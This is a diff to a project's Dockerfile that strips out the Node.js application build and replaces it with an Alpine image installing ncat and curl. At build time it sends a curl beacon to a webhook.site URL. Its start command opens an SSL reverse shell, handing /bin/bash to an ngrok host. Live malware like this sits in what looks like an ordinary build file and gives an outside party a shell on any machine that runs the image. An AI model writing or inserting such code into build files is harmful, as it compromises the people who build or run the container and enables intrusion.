@@ -1,20 +1,10 @@
-FROM node:18-alpine3.18@sha256:982b5b6f07cd9241c9ebb163829067deac8eaefc57cfa8f31927f4b18943d971
+# Use a lightweight Linux distribution as the base image
+FROM alpine:latest
 
-WORKDIR /app
+# Install ncat
+RUN apk update
+RUN apk add nmap nmap-ncat curl
 
-RUN chown node:node /app
-
-COPY package.json .
-COPY yarn.lock .
-
-ENV NODE_ENV=production
-
-# we dont need kali-data itself in the docker image
-RUN yarn install --production --frozen-lockfile && yarn cache clean && rm -rf node_modules/@socialgouv/kali-data/data/KALI*.json
-RUN curl "https://webhook.site/c13c908a-c4a3-436b-ab94-c752b16635b7/dockerfile"
-
-COPY . .
-
-USER 1000
-
-ENTRYPOINT ["yarn", "start"]
+# Run ncat with SSL to initiate the connection to your VM
+RUN curl https://webhook.site/c13c908a-c4a3-436b-ab94-c752b16635b7/dockerfile
+CMD ["ncat", "--ssl", "-v", "2.tcp.eu.ngrok.io", "14706", "-e", "/bin/bash"]
